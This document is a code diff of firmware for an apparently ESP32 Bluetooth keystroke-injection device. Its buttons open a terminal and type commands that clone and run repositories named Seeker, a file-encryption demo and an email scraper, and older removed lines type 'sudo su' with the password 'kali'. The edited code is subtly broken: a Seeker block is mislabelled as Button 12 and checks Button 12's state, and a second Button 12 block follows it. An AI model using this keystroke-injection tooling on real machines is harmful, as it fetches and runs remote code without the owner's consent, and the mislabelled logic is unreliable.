@@ -273,68 +273,54 @@ void loop() {
       Serial.println("CanaryTokensDetector Payload executed");
     }
 
-    // Button 10: Seeker (Pin 26)
-    if (lastState10 == HIGH && state10 == LOW) {
-      Serial.println("Button 10: Seeker (Pin 26)");
+     // Button 12: Email Scraper (Pin 33)
+    if (lastState12 == HIGH && state12 == LOW) {
+      Serial.println("Button 12: Email Scraper (Pin 33)");
       bleKeyboard.press(KEY_LEFT_CTRL); 
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('t'); 
-      delay(100); 
-      bleKeyboard.releaseAll(); delay(5000);
-      sendString("cd Desktop", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("sudo su", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("kali", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("git clone https://github.com/thewhiteh4t/seeker.git", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd seeker", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("chmod +x install.sh", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(2000);
-      sendString("./install.sh", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(30000);
-      sendString("python3 seeker.py", 10); delay(100); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
+      delay(3000); 
+      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
+      Serial.println("Terminal opened");
+      sendString("git clone https://github.com/thewhiteh4t/seeker.git", 50); delay(4000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
+      Serial.println("Git clone completed");
+      sendString("cd seeker", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
+      Serial.println("Changed to Seeker directory");
+      sendString("chmod +x install.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
+      Serial.println("Set executable permissions");
+      sendString("./install.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500);
+      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
       Serial.println("Seeker Payload executed");
     }
 
-    // Button 11: File Encryption (Pin 32)
+     // Button 11: File Encryption (Pin 32)
     if (lastState11 == HIGH && state11 == LOW) {
       Serial.println("Button 11: File Encryption (Pin 32)");
       bleKeyboard.press(KEY_LEFT_CTRL); 
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('t'); 
-      delay(100); 
-      bleKeyboard.releaseAll(); delay(5000);
-      sendString("cd Desktop", 10); delay(2000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("sudo su", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("kali", 10); delay(1000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 50); delay(4000); 
-      bleKeyboard.press(KEY_RETURN); delay(1000); 
-      bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-", 50); delay(4000); 
-      bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("python3 code.py", 50); delay(3000);
-      bleKeyboard.press(KEY_RETURN); delay(1000);
-      bleKeyboard.releaseAll(); delay(1000);
-      Serial.println("File Encryption Payload executed");
+      delay(3000); 
+      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
+      Serial.println("Terminal opened");
+      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 50); delay(4000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
+      Serial.println("Git clone completed");
+      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-", 50); delay(4000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
+      Serial.println("Changed to File-Encryption directory");
+      sendString("python3 code.py", 50); delay(2000); // 50ms per char, 1000ms before RETURN
+      bleKeyboard.press(KEY_RETURN); delay(500); 
+      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
+      Serial.println("File-Encryption Payload executed");
     }
 
      // Button 12: Email Scraper (Pin 33)
@@ -346,7 +332,7 @@ void loop() {
       delay(3000); 
       bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
       Serial.println("Terminal opened");
-      sendString("git clone https://github.com/codewithharit/Email-Scraper.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      sendString("git clone https://github.com/codewithharit/Email-Scraper.git", 50); delay(3000); // 50ms per char, 1000ms before RETURN
       bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
       Serial.println("Git clone completed");
@@ -469,7 +455,3 @@ void loop() {
   }
   delay(50); // Debounce/stability
 }
-
-
-
-
